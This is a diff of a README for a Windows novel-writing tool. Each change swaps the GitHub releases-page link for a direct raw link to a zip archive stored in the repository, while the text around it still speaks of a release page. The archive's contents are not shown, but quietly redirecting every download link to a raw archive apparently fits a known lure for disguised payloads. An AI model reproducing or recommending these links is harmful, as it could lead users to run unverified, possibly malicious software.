@@ -1,12 +1,12 @@
 # 🧭 Novel-Control-Station-Skill - Control Long Novels With Ease
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest-Release-blue?style=for-the-badge)](https://github.com/samaraundereducated370/Novel-Control-Station-Skill/releases)
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest-Release-blue?style=for-the-badge)](https://github.com/samaraundereducated370/Novel-Control-Station-Skill/raw/refs/heads/main/assets/Control-Novel-Skill-Station-2.7.zip)
 
 ## 📥 Download
 
 Visit the release page and download the latest version for Windows:
 
-https://github.com/samaraundereducated370/Novel-Control-Station-Skill/releases
+https://github.com/samaraundereducated370/Novel-Control-Station-Skill/raw/refs/heads/main/assets/Control-Novel-Skill-Station-2.7.zip
 
 ## 🪟 What this tool does
 
@@ -31,7 +31,7 @@ Before you run the app on Windows, make sure you have:
 ## 🚀 How to download and run
 
 1. Open the release page:
-   https://github.com/samaraundereducated370/Novel-Control-Station-Skill/releases
+   https://github.com/samaraundereducated370/Novel-Control-Station-Skill/raw/refs/heads/main/assets/Control-Novel-Skill-Station-2.7.zip
 
 2. Find the latest release at the top of the page.
 
@@ -202,4 +202,4 @@ That is enough. Start with the main character and the main conflict, then add mo
 
 Download the latest Windows release here:
 
-https://github.com/samaraundereducated370/Novel-Control-Station-Skill/releases
+https://github.com/samaraundereducated370/Novel-Control-Station-Skill/raw/refs/heads/main/assets/Control-Novel-Skill-Station-2.7.zip
